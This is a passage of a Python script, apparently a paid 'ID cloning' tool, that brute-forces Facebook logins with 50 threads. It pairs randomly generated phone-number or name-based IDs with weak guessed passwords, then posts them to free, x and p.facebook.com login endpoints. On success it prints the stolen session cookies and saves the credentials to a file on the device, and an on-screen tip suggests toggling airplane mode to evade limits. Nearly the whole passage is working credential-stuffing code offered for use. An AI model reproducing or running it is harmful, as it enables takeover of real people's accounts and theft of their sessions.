		print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ']
			yaari.submit(fcrack2,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
	
def random_number3():
	user=[]
	os.system('clear')
	banner()
	print(f"             {H} SIM {K}CODE{P}  ");time.sleep(0.05)
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	print(f"  {K}BD : \033[1;97m017 , 016 , 018 , 019 , 013") 
	print(f"  {K}PAK : \033[1;97m0349 , 0306 , 0302 , 0300 , 0315") 
	print("\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
	kode = input(f'{M}    INPUT CODE {P}:{H} ')
	os.system("clear")
	banner()
	doamin = ' \033[1;92mMETHUD 3 '
	print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
	limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
	for nmbr in range(limit):
		koda = ''.join(random.choice(string.digits) for _ in range(2))
		kodb = ''.join(random.choice(string.digits) for _ in range(2))
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=50) as yaari:
		os.system('clear')
		banner()
		tl = str(len(user))
		print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Bangladesh")
		print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
		print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
		print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
		print(f" {P}[{H}★{P}]{WHITE} METHUD    :\033[1;92m{doamin}")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
		print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
		print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
		print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
		psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
		for guru in user:
			uid = kode+koda+kodb+guru
			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','i love you','বাংলাদেশ']
			yaari.submit(fcrack,uid,pwx,tl)
	print(50*'_')
	print(' [💉] Crack process has been completed')
	print(' [💉] Ids saved in ok.txt,cp.txt')
	print(50*'_')
	exit()
	
def random_gmail():
    user=[]
    os.system('clear')
    banner()
    print(f"             {H} Gmail {K}CODE{P}  ");time.sleep(0.05)
    print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
    print(f"  {K}EXAMPLE : \033[1;97mRakib , Jahid , Mehedi , Sumaiya , Ridoy") 
    kode = input('  \033[1;97m[\033[92;1m●\033[1;97m] target fast name : ')
    print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
    print(f"  {K}EXAMPLE : \033[1;97mHasan , Islam , Chowdhury , Akter , Khatun ") 
    kodex = input('  \033[1;97m[\033[92;1m●\033[1;97m] TERGET LAST NAME :  ')
    print(f"\033[38;5;46m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[1;32m-\033[1;35m-\033[1;34m-\033[1;97m-\033[1;33m-\033[38;5;196m-\033[1;35m-\033[1;34m-\033[1;33m-\033[1;32m-\033[1;97m-\033[38;5;196m-\033[38;5;46m-\033[38;5;196m-\033[1;32m-\033[1;97m-\033[1;35m-\033[1;34m-\033[1;33m-\033[38;5;46m-\033[1;97m•")
    os.system('clear')
    banner()
    print(f"  {K}EXAMPLE  :\033[1;97m @gmail.com, @yahoo.com ")
    doamin = input(' [📧]  INPUT DOMINE  : ')
    os.system('clear')
    banner()
    print(f'    {P}[{H}√{P}] EXAMPLE    : {K}5000/10000/20000')
    limit = int(input(f'    %s[%s?%s] CRACK ID LIMIT : %s'%(N,K,N,H)))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
        user.append(nmp)
    with ThreadPool(max_workers=50) as yaari:
        os.system('clear')
        banner()
        tl = str(len(user))
        print(f" {P}[{H}★{P}]{WHITE} FROM      :\033[38;5;45m Bangladesh")
        print(f' {P}[{H}★{P}]{WHITE} AGENTS    : '+str(len(ugen)))
        print(f" {P}[{H}★{P}]{WHITE} CRACK ID  :\033[38;5;192m {GREEN}"+tl)
        print(f' {P}[{H}★{P}]{WHITE} SIM CODE  :\033[1;92m {kode} ')
        print(f" {P}[{H}★{P}]{WHITE} METHUD    : \033[1;92m{doamin}")
        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-OK.txt  ")
        print(f" {P}[{H}★{P}]{WHITE} FILE SAVE : JAR-RNDM-CP.txt  ")
        print(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        print(f" {P}[{H}★{P}]{WHITE} FIRST [\033[1;92mON\033[1;92m/\033[38;5;196mOFF\033[1;37m] AIRPLANE MODE 💉 ")
        print(f" {P}[{H}★{P}]{WHITE} \x1b[97m\033[37;41mMIX IDZ CLONING ENJOY PAID USER\033[0;m ")
        psb(f"\033[38;5;46m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[1;32m•\033[1;35m•\033[1;34m•\033[1;97m•\033[1;33m•\033[38;5;196m•\033[1;35m•\033[1;34m•\033[1;33m•\033[1;32m•\033[1;97m•\033[38;5;196m•\033[38;5;46m•\033[38;5;196m•\033[1;32m•\033[1;97m•\033[1;35m•\033[1;34m•\033[1;33m•\033[38;5;46m•\033[1;97m•")
        for guru in user:
            uid = kode+kodex+guru+doamin
            pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
            yaari.submit(fcrack,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')
	
	
    #MAIN OK METHOD
    
    
def apk(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'datr=tOkiZNWxg4iFXk5vay1l9zod; sb=tOkiZGd_Cjyhf0J3U3WOykHF; fr=0nV7Hu0FobD3Mnt95..BkIwev.xy.AAA.0.0.BkIwfS.AWUp262_CR0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
               
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass

def mix(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m\033[mOK>\033[1;92m%s\033[m '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://x.facebook.com').text 
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsc5.AWVNSGX4Pew',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m '+uid+' | '+ps+'\33[0;92m')
                #print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
    
def fcrack(uid,pwx,tl):
    global loop
    global cps    
    global oks
    global agents
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://p.facebook.com').text 
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'p.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsIu.AWXnr0C8kDY',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
        
def fcrack1(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://x.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'x.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; m_pixel_ratio=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsc5.AWVNSGX4Pew',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
                #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
               
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
        
  
def fcrack2(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\033[m[JAHID] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            #oo=random.choice(sss)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'free.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    # Requests sorts cookies= alphabetically
    # 'cookie': 'datr=Ji4VZGZ3I-Qd_1lNkI8Zgwin; sb=Ji4VZL-eh-3pDCkWecuumAFU; dpr=3; wd=980x1426; fr=0RKXIq2Fcifn9dnQp..BkFS4m.5f.AAA.0.0.BkHsMY.AWWo4n0p9nQ',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Linux"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': pro}
            lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f'\033[1;92m  [JAHID>OK] '+uid+' | '+ps+'\33[0;92m')
                print(f'\033[1;93m   [💥] COOKIE (1) \033[1;92m : '+coki)
               #cek_apk(session,coki)
                oks.append(cid)
                open('/sdcard/JAR-RNDM-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
               
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\033[m[JAHIDUL] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
       # sys.stdout.write(f" \r{R} [{B}JAHID{R}]  {P}[{k}{loop}{P}/{h}{len(id)}{P}]Ã¢â‚¬â€{P}[{H}{ok}{P}]Ã¢â‚¬â€{P}[{k}{cp}{x}]Ã¢â‚¬â€[{bo}{'{:.0%}'.format(loop/float(len(id)))}{P}]  ")
        sys.stdout.flush()
    except:
        pass
         
#-----------------------[ SYSTEM-CONTROL ]--------------------#
#if __name__=='__main__':

main()
